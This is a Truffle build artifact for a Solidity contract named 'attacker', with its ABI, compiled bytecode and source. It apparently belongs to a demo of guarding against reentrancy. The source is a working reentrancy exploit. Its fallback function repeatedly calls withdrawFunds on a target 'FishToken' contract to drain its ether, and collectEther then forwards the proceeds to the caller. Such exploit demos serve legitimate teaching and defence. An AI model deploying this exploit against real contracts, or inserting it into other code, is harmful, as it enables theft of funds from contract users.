{
  "contractName": "attacker",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "fishToken",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_fishTokenAddress",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "pwnEtherStore",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "collectEther",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405160208061046283398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506103df806100836000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680636289d385146101465780636a1e2dc114610150578063ff11e1db146101a7575b6127106000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311115610144576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee6127106040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561012b57600080fd5b505af115801561013f573d6000803e3d6000fd5b505050505b005b61014e6101be565b005b34801561015c57600080fd5b5061016561032e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101b357600080fd5b506101bc610353565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166360ab58526127106040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016020604051808303818588803b15801561024557600080fd5b505af1158015610259573d6000803e3d6000fd5b50505050506040513d602081101561027057600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee6127106040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561031457600080fd5b505af1158015610328573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156103b0573d6000803e3d6000fd5b505600a165627a7a72305820a3e4b3c83447adfc560e4bdbe55b4b3f4f0f17eb224c4d30bf8136c832bd78bf0029",
  "source": "pragma solidity ^0.4.24;\n\nimport \"./code.sol\";\n\ncontract attacker {\n\n    FishToken public fishToken;\n\n    constructor(address _fishTokenAddress){\n        fishToken = FishToken(_fishTokenAddress);\n    }\n\n    function pwnEtherStore() public payable {\n        fishToken.issueTokens.value(10000)();\n        fishToken.withdrawFunds(10000);\n    }\n\n    function collectEther() public {\n        msg.sender.transfer(this.balance);\n    }\n\n    function() payable {\n        if (fishToken.balance > 10000) {\n            fishToken.withdrawFunds(10000);\n        }\n    }\n}\n",
  "sourcePath": "/home/xcrab/MyWorkspace/DEMO_Guard/before_Guard/contracts/attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "3.0.2",
  "updatedAt": "2019-05-08T17:25:55.799Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}